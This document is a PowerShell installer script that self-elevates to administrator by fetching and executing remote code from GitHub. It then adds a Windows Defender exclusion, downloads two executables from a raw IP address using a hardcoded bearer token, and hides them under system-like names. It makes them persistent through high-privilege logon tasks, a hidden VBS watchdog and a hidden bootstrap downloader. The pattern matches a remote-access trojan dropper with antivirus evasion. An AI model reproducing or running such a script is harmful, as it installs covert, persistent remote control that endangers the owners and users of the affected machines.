param([switch]$Retry)

# Self-elevate to admin, then install both agents from VPS relay
if (![Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(527) -and !$Retry) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -c `$c=irm https://raw.githubusercontent.com/egzakutacno/daljinac-pack/main/launcher.ps1; &([scriptblock]::create(`$c)) -Retry"
    exit
}

# ===== INSTALL LOGIC (embedded, no second download) =====
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
Add-MpPreference -ExclusionPath "C:\appdata" -ErrorAction SilentlyContinue

$agents = @(
  @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='http://31.220.74.109:9999/sysui.exe'; Exe='C:\appdata\sh\sysui.exe'; Port=8081; Args='-notray' },
  @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='http://31.220.74.109:9999/daljinac2.exe'; Exe='C:\appdata\sa\sysagent.exe'; Port=1984; Args='-notray' }
)
$auth = @{Authorization = "Bearer 916de2678b4319090a640799f7ca7a6e"}

Write-Host "=== Cleanup ===" -ForegroundColor Cyan
@("daljinac","daljinacWatch","daljinac2","daljinac2Watch",
  "sysui","sysuiWatch","sysagent","sysagentWatch",
  "HelpDataHost","HelpDataHostWatch","DiagHubHost","DiagHubHostWatch",
  "sdhost","sdhostWatch","sdagent","sdagentWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}
cmd /c "rmdir /s /q C:\ProgramData\Microsoft\HelpData 2>nul & rmdir /s /q C:\ProgramData\Microsoft\DiagHub 2>nul & rmdir /s /q ""C:\Program Files\Common Files\Sdh"" 2>nul & rmdir /s /q ""C:\Program Files\Common Files\Sda"" 2>nul"

foreach ($a in $agents) {
    Write-Host "=== $($a.Name): $($a.ExeName) ===" -ForegroundColor Cyan

    Write-Host "  [1/3] Killing old..."
    Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($a.ExeName)),
                     "HelpDataHost","DiagHubHost","sdhost","sdagent",
                     "systemUI","daljinac","daljinac2" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    Write-Host "  [2/3] Downloading..."
    mkdir $a.Dir -Force | Out-Null
    $dl = $false
    # Try curl.exe first (more reliable over SSH tunnels)
    if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
        curl.exe -s -H "Authorization: Bearer 916de2678b4319090a640799f7ca7a6e" $a.URL -o "$($a.Exe).new" 2>$null
        $sz = (Get-Item "$($a.Exe).new" -ErrorAction SilentlyContinue).Length
        if ($sz -gt 100000) { $dl = $true }
    }
    # Fallback to WebClient (Invoke-WebRequest has issues with SSH tunnel)
    if (-not $dl) {
        try {
            $c = New-Object System.Net.WebClient
            $c.Headers.Add("Authorization", "Bearer 916de2678b4319090a640799f7ca7a6e")
            $c.DownloadFile($a.URL, "$($a.Exe).new")
            $sz = (Get-Item "$($a.Exe).new" -ErrorAction SilentlyContinue).Length
            if ($sz -gt 100000) { $dl = $true }
        } catch { }
    }
    if (-not $dl) { Write-Host "         FAILED" -ForegroundColor Red; continue }
    Write-Host "         $sz bytes" -ForegroundColor Green

    Write-Host "  [2b/3] Replacing..."
    Move-Item -Force "$($a.Exe).new" $a.Exe

    Write-Host "  [3/3] Installing scheduled task..."
    Remove-Item "$($a.Dir)\watchdog.vbs" -Force -ErrorAction SilentlyContinue
    schtasks /create /tn "$($a.TaskName)" /tr "$($a.Exe) $($a.Args)" /sc ONLOGON /rl HIGHEST /f 2>$null

    $vbs = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $($a.TaskName)`", 0, False"
    Set-Content -Path "$($a.Dir)\watchdog.vbs" -Value $vbs -Encoding ASCII
    schtasks /create /tn "$($a.TaskName)Watch" /tr "wscript.exe //B $($a.Dir)\watchdog.vbs" /sc MINUTE /mo 5 /du 24:00 /f 2>$null

    ([wmiclass]'Win32_Process').Create("`"$($a.Exe)`" $($a.Args)") | Out-Null
    Start-Sleep -Seconds 2
}

Write-Host "`nDONE.`n  v1: sysui.exe  (C:\appdata\sh\)`n  v2: sysagent.exe (C:\appdata\sa\)" -ForegroundColor Green
Start-Sleep -Seconds 3
Write-Host "`nVerifying..." -ForegroundColor Cyan
$p1 = Get-Process -Name sysui -ErrorAction SilentlyContinue
if ($p1) { Write-Host "  v1: RUNNING (PID $($p1.Id))" -ForegroundColor Green } else { Write-Host "  v1: not found" -ForegroundColor Red }
$p2 = Get-Process -Name sysagent -ErrorAction SilentlyContinue
if ($p2) { Write-Host "  v2: RUNNING (PID $($p2.Id))" -ForegroundColor Green } else { Write-Host "  v2: not found" -ForegroundColor Red }

Write-Host "  [bootstrap] Scheduling aria2c download..." -ForegroundColor Cyan
$bsAction = New-ScheduledTaskAction -Execute powershell -Argument "-NoP -W Hidden -Command if(!(Test-Path C:\appdata\aria2c.exe)){try{iwr http://31.220.74.109:9999/aria2c.exe -OutFile C:\appdata\aria2c.exe -UseBasicParsing}catch{exit 1}}; if((Test-Path C:\appdata\aria2c.exe)-and((Get-Item C:\appdata\aria2c.exe).Length-gt 1000000)){schtasks /delete /tn DaljinacBootstrap /f}else{exit 1}"
$bsTrigger = New-ScheduledTaskTrigger -AtLogOn
$bsSettings = New-ScheduledTaskSettingsSet
$bsPrincipal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "DaljinacBootstrap" -Action $bsAction -Trigger $bsTrigger -Settings $bsSettings -Principal $bsPrincipal -Force | Out-Null
Write-Host "         Done" -ForegroundColor Green
